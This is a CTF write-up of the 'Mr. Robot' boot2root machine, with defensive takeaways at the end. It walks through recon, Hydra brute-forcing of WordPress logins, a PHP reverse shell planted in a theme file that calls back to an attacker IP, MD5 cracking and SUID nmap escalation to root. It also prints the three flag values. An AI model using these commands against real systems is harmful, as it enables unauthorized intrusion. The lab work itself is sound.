# Mr. Robot CTF — Writeup

A walkthrough of the "Mr. Robot" themed boot2root machine, based on the TV series of the same name. The goal is to find three hidden keys scattered across the box, with the final one requiring full root access.

**Skills covered:** web enumeration, WordPress brute-forcing, reverse shells, hash cracking, and SUID privilege escalation.

---

## 1. Reconnaissance

I started with an `nmap` scan to see what was exposed:

```
nmap -sC -sV -Pn -T4 10.49.161.96
```

- `-sC` runs the default NSE scripts
- `-sV` does service/version detection
- `-Pn` skips host discovery (treats the host as up) — useful when ICMP is blocked
- `-T4` speeds up timing

Results:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

So we've got SSH, HTTP, and HTTPS. With no obvious SSH credentials yet, the web server on port 80 is the logical starting point.

## 2. Directory Enumeration

Next, I ran `gobuster` against the web root to find hidden directories:

```
gobuster dir -u http://10.49.161.96 -w /home/rza/stuff/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

The scan turned up a lot of standard WordPress structure (`/wp-content`, `/wp-includes`, `/wp-login`, etc.), but two entries stood out immediately:

```
/robots               (Status: 200) [Size: 41]
/wp-login             (Status: 200) [Size: 2606]
```

`/wp-login` confirms the site is running WordPress — that's our likely attack surface for gaining initial access. `/robots` is worth checking manually, since `robots.txt` files sometimes leak paths that aren't meant to be crawled (or indexed) but are still directly accessible.

## 3. robots.txt and the First Key

Visiting `http://10.49.161.96/robots.txt` revealed:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two files, neither of which should normally be referenced in a `robots.txt` — a strong sign they were planted intentionally.

- **`key-1-of-3.txt`** → visiting it directly gave the first key:
    
    ```
    073403c8a58a1f80d943455fb30724b9
    ```
    
- **`fsocity.dic`** → a huge wordlist (858,160 words), clearly intended as ammo for a brute-force attack later. It looks like scraped content from the Mr. Robot wiki (character names, episode terms, in-universe jargon), used as a custom dictionary.

**Key 1 of 3 obtained.** ✅

## 4. Trimming the Wordlist

858,160 words is a lot to brute-force with, and the file is full of duplicates. Before throwing it at anything, I deduplicated it:

```bash
wc -w fsocity.dic
# 858160

sort fsocity.dic | uniq -d > fs-list   # repeated words
sort fsocity.dic | uniq -u >> fs-list  # append unique words

wc -w fs-list
# 11451
```

This cuts the list down from ~858K words to ~11.4K — a massive reduction that makes the upcoming brute-force attacks actually practical in a reasonable timeframe.

## 5. Finding a Valid Username

Before brute-forcing anything, I needed to know how WordPress responds to a bad login, so I could tell Hydra what "failure" looks like. Submitting garbage credentials (`aaaa` / `aaaa`) to `/wp-login.php` returned:

```
ERROR: Invalid username.
```

with POST parameters `log`, `pwd`, `wp-submit`, `redirect_to`, and `testcookie`.

That error message — **"Invalid username"** — is exactly the string I need to tell Hydra when a username attempt has failed. Now I can brute-force the `fs-list` wordlist against the `log` parameter, using a static (irrelevant) password, and let Hydra flag any entry that _doesn't_ trigger that error:

```bash
hydra -L fs-list -p test 10.49.161.96 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

- `-L fs-list` — treat each line as a candidate **username**
- `-p test` — use a single throwaway password for every attempt (we don't care about this yet, only whether the username is valid)
- `http-post-form` — tells Hydra the target uses a POST-based login form
- `log=^USER^&pwd=^PASS^` — the POST body template; Hydra substitutes `^USER^`/`^PASS^` with wordlist entries
- `F=Invalid username` — the **failure condition**. Any response _not_ containing this string is reported as a hit
- `-t 30` — 30 parallel threads

After running for about 23 minutes, Hydra reported several candidate usernames:

```
[80][http-post-form] host: 10.49.161.96   login: 3282s     password: test
[80][http-post-form] host: 10.49.161.96   login: 326       password: test
[80][http-post-form] host: 10.49.161.96   login: buddies   password: test
[80][http-post-form] host: 10.49.161.96   login: bummed    password: test
[80][http-post-form] host: 10.49.161.96   login: elliot    password: test
[80][http-post-form] host: 10.49.161.96   login: Elliot    password: test
[80][http-post-form] host: 10.49.161.96   login: ELLIOT    password: test
```

Most of these are false positives caused by the wordlist's noise, but `elliot` is the obvious real candidate — Elliot Alderson is the show's protagonist, and it's the only "clean" username-looking result among the hits.

## 6. Cracking Elliot's Password

With a confirmed valid username, I flipped the attack around: now Hydra brute-forces the **password** field for the known-good username `elliot`, and I needed WordPress's error message for a _wrong password_ (as opposed to a wrong username) to set the correct failure condition:

```bash
hydra -l elliot -P fs-list 10.48.190.26 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

Note the case change: lowercase `-l elliot` for a single fixed username, uppercase `-P fs-list` for the password wordlist.

This returned:

```
ER28-062
```

**Credentials obtained: `elliot` / `ER28-062`**

## 7. Gaining a Shell via the WordPress Theme Editor

Logging in to `/wp-login.php` with `elliot:ER28-062` dropped me into the WordPress dashboard with what turned out to be administrator privileges. Admin access to WordPress means access to **Appearance → Editor**, which lets you directly edit theme PHP files from the browser — and since those files execute server-side, this is a direct path to code execution.

I used the classic [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), pasting it over the contents of a theme template (the `archive.php` file in the `twentyfifteen` theme), after changing the `$ip` and `$port` variables to point at my attacking machine:

```php
$ip = '192.168.143.9';  // my machine
$port = 4444;
```

After saving ("Update File"), I started a listener:

```bash
nc -lvnp 4444
```

...and triggered the shell by simply visiting the now-modified template in a browser:

```
http://10.49.161.82/wp-content/themes/twentyfifteen/archive.php
```

The listener caught the callback:

```
Connection received on 10.49.161.82 44106
Linux ip-10-49-161-82 5.15.0-139-generic #149~20.04.1-Ubuntu SMP ... x86_64 GNU/Linux
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**Shell obtained as `daemon`.**

## 8. Finding the Second Key — and a Locked Door

Enumerating the filesystem from the new shell:

```bash
ls -la /home
# robot
# ubuntu

cd /home/robot
ls
# key-2-of-3.txt
# password.raw-md5

cat key-2-of-3.txt
# Permission denied

cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

`key-2-of-3.txt` is owned by `robot` and the `daemon` user can't read it — but `password.raw-md5` is readable, and conveniently hands over robot's password hash.

### Cracking the hash

The hash `c3fcd3d76192e4007dfb496cca67e13b` is MD5. Running it through a cracker resolves to:

```
abcdefghijklmnopqrstuvwxyz
```

(the alphabet — a deliberately crackable hash, consistent with this being an intentionally-designed CTF box rather than a real-world target).

### Switching to robot

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz

id
# uid=1002(robot) gid=1002(robot) groups=1002(robot)

cat key-2-of-3.txt
# 822c73956184f694993bede3eb39f959
```

**Key 2 of 3 obtained.** ✅

> **Note:** the reverse shell from the PHP payload is non-interactive (no TTY), which can cause `su` to misbehave or hang on some setups since it expects a real terminal for the password prompt. If that happens, upgrading to a proper TTY first — e.g. `python -c 'import pty; pty.spawn("/bin/bash")'` — fixes it before attempting `su`.

## 9. Privilege Escalation to root

With a foothold as `robot`, the last key requires root. I looked for SUID binaries — files that run with the privileges of their _owner_ rather than the user executing them, which makes any SUID binary owned by root a potential privesc vector:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Output included the usual system binaries (`/bin/su`, `/usr/bin/passwd`, `/usr/bin/sudo`, etc.) but one entry stood out as unusual to find with the SUID bit set:

```
/usr/local/bin/nmap
```

`nmap`, specifically in its older interactive mode, can be abused to spawn a shell — and if the binary is SUID root, that shell inherits root privileges. This is a well-documented technique (GTFOBins lists it under nmap's escalation methods for versions supporting `--interactive`):

```bash
nmap --interactive
nmap> !sh

id
# uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

**Root obtained.**

```bash
cd /root
ls
# firstboot_done
# key-3-of-3.txt

cat key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

**Key 3 of 3 obtained.** ✅

---

## Summary

|Key|Value|How obtained|
|---|---|---|
|Key 1|`073403c8a58a1f80d943455fb30724b9`|Found via `robots.txt` disclosure|
|Key 2|`822c73956184f694993bede3eb39f959`|Cracked `robot`'s MD5 hash, `su`'d to the account|
|Key 3|`04787ddef27c3dee1ee161b21670b4e4`|SUID `nmap` privilege escalation to root|

### Attack chain at a glance

1. **Recon** — `nmap` finds HTTP/HTTPS/SSH; `gobuster` finds `/wp-login` and `/robots`
2. **Info disclosure** — `robots.txt` leaks Key 1 and a huge candidate wordlist (`fsocity.dic`)
3. **Wordlist prep** — dedupe `fsocity.dic` down to a workable 11.4K-word list
4. **Username enumeration** — Hydra + WordPress's "Invalid username" error to find `elliot`
5. **Password brute-force** — Hydra again, now targeting the password field, to find `ER28-062`
6. **Initial access** — admin WordPress login → theme editor → PHP reverse shell → shell as `daemon`
7. **Lateral movement** — MD5 hash crack → `su robot` → Key 2
8. **Privilege escalation** — SUID `nmap` interactive mode abuse → root → Key 3

### Takeaways / lessons

- **`robots.txt` is not an access control** — it's an advisory file for search engine crawlers, and anything listed in it is still directly reachable if the files exist on the server.
- **Deduplicating wordlists matters.** An 858K-word list is slow to brute-force; cutting it down to 11K unique entries turned an impractical attack into a ~20-minute one.
- **Error message differences are an oracle.** WordPress (like many login systems) reveals a subtle difference between "bad username" and "bad password" errors, which let Hydra be pointed precisely instead of blindly guessing both fields at once.
- **Admin access to a CMS is effectively code execution.** Any CMS that lets an administrator edit server-side template/theme files (WordPress, and similar systems) should be treated as equivalent to shell access, since templates execute as the web server user.
- **Audit SUID binaries regularly**, especially on tools like `nmap`, `vim`, `find`, `less`, etc., that have well-known shell-escape functionality (see GTFOBins) — an SUID bit on the wrong binary is a direct root shortcut.

---

_Writeup based on my own enumeration and exploitation notes, cross-referenced against a public walkthrough by Charalampos Spanias on Medium for error-message wording and methodology confirmation._